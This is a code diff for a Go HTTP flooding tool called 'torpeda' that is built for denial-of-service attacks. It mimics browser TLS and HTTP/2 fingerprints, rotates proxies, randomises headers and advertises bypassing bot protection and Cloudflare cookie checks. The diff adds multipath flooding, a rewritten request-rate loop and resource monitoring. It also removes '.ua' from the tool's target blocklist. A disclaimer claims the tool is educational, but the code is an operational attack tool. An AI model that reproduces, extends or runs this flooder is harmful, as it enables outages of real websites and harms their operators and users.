@@ -2,31 +2,36 @@ package main
 
 import (
 	"bufio"
-	"net"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
+	"net"
 	"net/url"
 	"os"
+	"runtime"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
-	"sort"
 	"sync/atomic"
 	"time"
 
 	http "github.com/bogdanfinn/fhttp"
-	tls "github.com/bogdanfinn/utls"
 	"github.com/bogdanfinn/fhttp/http2"
+	tls "github.com/bogdanfinn/utls"
 	"github.com/panjf2000/ants/v2"
 	"h12.io/socks"
+
+	"github.com/shirou/gopsutil/cpu"
+	"github.com/shirou/gopsutil/mem"
 )
 
 var (
+	connections       int32
 	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
-	settingsFrame = map[http2.SettingID]uint32{
+	settingsFrame     = map[http2.SettingID]uint32{
 		http2.SettingHeaderTableSize:   65536,
 		http2.SettingEnablePush:        0,
 		http2.SettingInitialWindowSize: 6291456,
@@ -41,70 +46,70 @@ var (
 )
 
 var supportedVersions = []uint16{
-	0xfafa,           
-	tls.VersionTLS13, 
-	tls.VersionTLS12, 
+	0xfafa,
+	tls.VersionTLS13,
+	tls.VersionTLS12,
 }
 
 var cipherSuites = []uint16{
 	0x3a3a,
-	tls.TLS_AES_128_GCM_SHA256,                        
-	tls.TLS_AES_256_GCM_SHA384,                        
-	tls.TLS_CHACHA20_POLY1305_SHA256,                  
-	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,       
-	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,         
-	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,       
-	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,         
+	tls.TLS_AES_128_GCM_SHA256,
+	tls.TLS_AES_256_GCM_SHA384,
+	tls.TLS_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,   
-	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,            
-	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,          
-	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,               
-	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,              
-	tls.TLS_RSA_WITH_AES_128_CBC_SHA,                 
-	tls.TLS_RSA_WITH_AES_256_CBC_SHA,                
+	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
 }
 
 var supportedGroups = []tls.CurveID{
 	25497,
-	tls.X25519,   
-	tls.CurveP256, 
-	tls.CurveP384, 
+	tls.X25519,
+	tls.CurveP256,
+	tls.CurveP384,
 }
 
 var (
-	reqmethod        string
-	target           string
-	duration         int
-	threads          int
-	rps              float64
-	proxies          = []string{}
-	proxyFile        string
+	reqmethod string
+	target    string
+	duration  int
+	threads   int
+	rps       float64
+	proxies   = []string{}
+	proxyFile string
 
-	debug            bool
-	extra            bool
-	test             bool
-	redirect         bool
-	parsed           bool
-	cf               bool
-	usehttp1         bool
+	debug    bool
+	extra    bool
+	test     bool
+	redirect bool
+	parsed   bool
+	cf       bool
+	usehttp1 bool
 
-	cookies          = ""
-	timeoutCount     int
-	refererURL       string
-	customCookie     string
-	customUserAgent  string
+	cookies         = ""
+	timeoutCount    int
+	refererURL      string
+	customCookie    string
+	customUserAgent string
 
 	connectionFlow   = uint32(15663105)
 	statusMutex      sync.Mutex
 	statusMap        = make(map[int]int)
 	customHeaders    = make(map[string]string)
 	licenseVerified  = false
-	paths []string
+	paths            []string
 	currentPathIndex int32
-	wg sync.WaitGroup
+	wg               sync.WaitGroup
 
-	blockedDomains = []string{".gov", ".by", ".ua", ".edu", ".int", ".mil"}
+	blockedDomains = []string{".gov", ".by",  ".edu", ".int", ".mil"}
 
 	randomReferers = []string{
 		"https://www.google.com",
@@ -126,7 +131,7 @@ var (
 )
 
 const licenseURL = "https://raw.githubusercontent.com/Pxttern/license-for-torpeda/main/license"
-const requiredLicense = "1337" 
+const requiredLicense = "1337"
 
 func checkLicense() {
 	if licenseVerified {
@@ -137,7 +142,7 @@ func checkLicense() {
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 		},
-		ForceAttemptHTTP2: false, 
+		ForceAttemptHTTP2: false,
 	}
 	client := &http.Client{
 		Timeout:   15 * time.Second,
@@ -166,27 +171,27 @@ func checkLicense() {
 }
 
 func isBlockedDomain(target string) bool {
-    parsedURL, err := url.Parse(target)
-    if err != nil {
-        os.Exit(1)
-    }
+	parsedURL, err := url.Parse(target)
+	if err != nil {
+		os.Exit(1)
+	}
 
-    for _, domain := range blockedDomains {
-        if strings.HasSuffix(parsedURL.Hostname(), domain) {
-            return true
-        }
-    }
-    return false
+	for _, domain := range blockedDomains {
+		if strings.HasSuffix(parsedURL.Hostname(), domain) {
+			return true
+		}
+	}
+	return false
 }
 
 func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
-	fmt.Print("\033[H\033[2J")
-	fmt.Println(`	[flooder - golang] torpeda v0.6 // Updated: 15.11.2024 // Made with love :D
-	Developers to method: mitigations aka @rapidreset
+		fmt.Print("\033[H\033[2J")
+		fmt.Println(`	[flooder - golang] torpeda v0.7 // Updated: 16.11.2024 // Made with love :D
+	Developers to method: @rapidreset aka mitigations / @benshii
 	WARNING: The method was done for educational purposes, all responsibility is on you!
-	Annoucement: torpeda channel (in bio) / @rapidreset
+	Annoucement: @devtorpeda / @rapidreset
 	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
 	How to use & example:
 
@@ -205,6 +210,7 @@ func main() {
 	--ua "<string>" - For custom useragent ex: "curl/4.0"
 	--cf - For sites who has protection based on check cf_clearence cookies
 	--http1 - For sites who have only http/1.1 
+	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
 	 `)
 	return
 }
@@ -222,9 +228,9 @@ func main() {
 	}
 
 	if isBlockedDomain(target) {
-        fmt.Println("[#2] This target in blacklist if this mistake pm @rapidreset")
-        os.Exit(1)
-    }
+		fmt.Println("[#2] This target in blacklist if this mistake pm @rapidreset")
+		os.Exit(1)
+	}
 
 	if !strings.HasPrefix(target, "https://") && !strings.HasPrefix(target, "http://") {
 		fmt.Println("[#3] Target must start with https:// or http://")
@@ -245,7 +251,7 @@ func main() {
 		fmt.Println("[#6] Ratelimit must be between 0.1 and 128")
 		os.Exit(1)
 	}
-	paths = []string{""} 
+	paths = []string{""}
 	for i := 0; i < len(os.Args); i++ {
 		switch os.Args[i] {
 		case "--debug":
@@ -284,7 +290,7 @@ func main() {
 	}
 
 	checkLicense()
-	
+
 	readProxies()
 
 	fmt.Println("Attack started!")
@@ -296,16 +302,15 @@ func main() {
 	p, _ := ants.NewPool(threads)
 	defer p.Release()
 
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		p.Submit(func() {
-			for _, proxy := range proxies {
-				go start(proxy)
-			}
-		})
-		wg.Wait()
+	 for i := 0; i < threads; i++ {
+ 	  wg.Add(1)
+  	  p.Submit(func() {
+     	   for _, proxy := range proxies {
+      	      go start(proxy)
+    	    }
+ 	   })
 	}
-
+	wg.Wait()
 	time.Sleep(time.Duration(duration) * time.Second)
 }
 
@@ -410,12 +415,12 @@ func randomHeader() http.Header {
 	if err != nil {
 		os.Exit(1)
 	}
-	domain := parsedURL.Host 
+	domain := parsedURL.Host
 
 	if usehttp1 {
 		header = http.Header{
-			"Host": 					 []string{domain},
-			"Connection": 			     []string{"keep-alive"},
+			"Host":                      []string{domain},
+			"Connection":                []string{"keep-alive"},
 			"Cache-Control":             []string{"max-age=0"},
 			"sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
 			"sec-ch-ua-mobile":          []string{"?0"},
@@ -574,28 +579,8 @@ func ResponseBody(resp *http.Response) {
 	fmt.Println(pageContent)
 }
 
-func createRatePattern(rps float64) []time.Duration {
-	intervals := []time.Duration{}
-	intPart := int(rps)
-	fracPart := rps - float64(intPart)
-
-	for i := 0; i < intPart; i++ {
-		intervals = append(intervals, time.Second/time.Duration(intPart))
-	}
-
-	if fracPart > 0 {
-		extraInterval := time.Duration(float64(time.Second) * fracPart)
-		intervals = append(intervals, extraInterval)
-	}
-
-	return intervals
-}
-
-
 func getCurrentPath() string {
-	// Получаем текущий индекс и увеличиваем его атомарно
 	index := atomic.AddInt32(&currentPathIndex, 1) - 1
-	// Рассчитываем фактический индекс с учетом циклического прохождения
 	return paths[index%int32(len(paths))]
 }
 
@@ -626,7 +611,7 @@ func start(proxy string) {
 			CurvePreferences:         supportedGroups,
 			CipherSuites:             cipherSuites,
 			ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-			NextProtos:               []string{"http/1.1"}, 
+			NextProtos:               []string{"http/1.1"},
 			PreferServerCipherSuites: false,
 			InsecureSkipVerify:       true,
 		}
@@ -712,62 +697,61 @@ func start(proxy string) {
 	fullTarget := target + currentPath
 
 	req, err := http.NewRequest(reqmethod, fullTarget, nil)
-    if err != nil {
-		updateErrorCounters(err) 
-        return 
-    }
+	if err != nil {
+		updateErrorCounters(err)
+		return
+	}
 
-    req.Header = randomHeader()
+	req.Header = randomHeader()
 
-    if customCookie != "" {
-        processedCookie := processCustomCookie(customCookie)
-        req.Header.Set("Cookie", processedCookie)
-    }
+	if customCookie != "" {
+		processedCookie := processCustomCookie(customCookie)
+		req.Header.Set("Cookie", processedCookie)
+	}
 
-    resp, err := client.Do(req)
-    if err != nil {
-        return 
-    }
-    defer resp.Body.Close()
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
 
-    if parsed {
-        parseCookies(resp)
-    }
+	if parsed {
+		parseCookies(resp)
+	}
 
-    if test {
-        ResponseBody(resp)
-    }
+	if test {
+		ResponseBody(resp)
+	}
 
-    ratePattern := createRatePattern(rps)
+	// ratePattern := createRatePattern(rps)
+	// fmt.Printf("length: %d\nratePattern: %v\n", len(ratePattern), ratePattern)
 
-    for _, interval := range ratePattern {
-        ticker := time.NewTicker(interval)
-        defer ticker.Stop()
+	atomic.AddInt32(&connections, 1)
 
-        wg.Add(1)
-        go func() {
-            defer wg.Done()
-            for range ticker.C {
-                resp, err := client.Do(req)
-				if err != nil {
-					updateErrorCounters(err)
-                    continue
-                }
-				resp.Body.Close()
-                updateStatusMap(resp.StatusCode)
-            }
-        }()
-    }
-    wg.Wait()
+	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
+	defer rateLimit.Stop()
+
+	for {
+		select {
+		case <-rateLimit:
+			resp, err := client.Do(req)
+			if err != nil {
+				updateErrorCounters(err)
+				continue
+			}
+			resp.Body.Close()
+			updateStatusMap(resp.StatusCode)
+		}
+	}
 }
 
 func updateErrorCounters(err error) {
-    statusMutex.Lock()
-    defer statusMutex.Unlock()
+	statusMutex.Lock()
+	defer statusMutex.Unlock()
 
-    if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-        timeoutCount++
-    }
+	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+		timeoutCount++
+	}
 }
 
 func updateStatusMap(statusCode int) {
@@ -776,16 +760,32 @@ func updateStatusMap(statusCode int) {
 	statusMap[statusCode]++
 }
 
+func CPU() (float64, error) {
+	percentages, err := cpu.Percent(0, false)
+	if err != nil {
+		return 0, err
+	}
+	return percentages[0], nil
+}
+
+func MEM() (float64, error) {
+	vmStat, err := mem.VirtualMemory()
+	if err != nil {
+		return 0, err
+	}
+	return vmStat.UsedPercent, nil
+}
+
 func printStatuses() {
-    startTime := time.Now()
-    totalRequests := 0
+	startTime := time.Now()
+	totalRequests := 0
 
-    for debug {
-        time.Sleep(time.Second)
-        statusMutex.Lock()
+	for debug {
+		time.Sleep(time.Second)
+		statusMutex.Lock()
 
-        fmt.Print("\033[H\033[2J")
-fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		fmt.Print("\033[H\033[2J")
+		fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣆⠀⠀⠀⣾⣿⣿⣿⣷⠄⠀⠰⠤⣀⠀⠀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠃⢺⣿⣿⣿⣿⡄⠀⠀⣿⣿⢿⣿⣿⣦⣦⣦⣶⣼⣭⣼⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⡆⠂⣿⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -805,44 +805,56 @@ fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠�
 ⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
 ⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
-        fmt.Println("> Version: v0.6")
-        fmt.Println("> Request Method:", reqmethod)
-        fmt.Println("> Target:", target)
-        fmt.Println("> Time:", duration)
-        fmt.Println("> Threads:", threads)
-        fmt.Println("> Ratelimit:", rps)
+		fmt.Println("> Version: v0.6")
+		fmt.Println("> Request Method:", reqmethod)
+		fmt.Println("> Target:", target)
+		fmt.Println("> Time:", duration)
+		fmt.Println("> Threads:", threads)
+		fmt.Println("> Ratelimit:", rps)
 
 		currentTime := time.Now()
-        elapsedTime := currentTime.Sub(startTime).Seconds()
-        averageRPS := float64(totalRequests) / elapsedTime
-        remainingTime := float64(duration) - elapsedTime
+		elapsedTime := currentTime.Sub(startTime).Seconds()
+		averageRPS := float64(totalRequests) / elapsedTime
+		remainingTime := float64(duration) - elapsedTime
 
-        if remainingTime < 0 {
-            remainingTime = 0
-        }
+		if remainingTime < 0 {
+			remainingTime = 0
+		}
 
-        var codes []int
-        for code := range statusMap {
-            codes = append(codes, code)
-        }
-        sort.Ints(codes)
+		var codes []int
+		for code := range statusMap {
+			codes = append(codes, code)
+		}
+		sort.Ints(codes)
 
-        statusString := "Status Codes:"
-        for _, code := range codes {
-            statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
-        }
-        statusString += fmt.Sprintf(" [H2_CLOSE: %d]", timeoutCount)
+		cpuUsage, err := CPU()
+		if err != nil {
+			cpuUsage = 0
+		}
 
-        fmt.Printf("%s\n", statusString)
-        fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
-        fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)
+		memUsage, err := MEM()
+		if err != nil {
+			memUsage = 0
+		}
 
-        for _, count := range statusMap {
-            totalRequests += count
-        }
+		statusString := "Status Codes:"
+		for _, code := range codes {
+			statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
+		}
+		statusString += fmt.Sprintf(" [H2_CLOSE: %d]", timeoutCount)
+		fmt.Printf("Go routines (threads): %d\n", runtime.NumGoroutine())
+		fmt.Printf("Connections: %d\n", connections)
+		fmt.Printf("%s\n", statusString)
+		fmt.Printf("CPU: %.2f%%, MEM: %.2f%%\n", cpuUsage, memUsage)
+		fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
+		fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)
 
-        statusMap = make(map[int]int)
-        timeoutCount = 0
-        statusMutex.Unlock()
-    }
+		for _, count := range statusMap {
+			totalRequests += count
+		}
+
+		statusMap = make(map[int]int)
+		timeoutCount = 0
+		statusMutex.Unlock()
+	}
 }
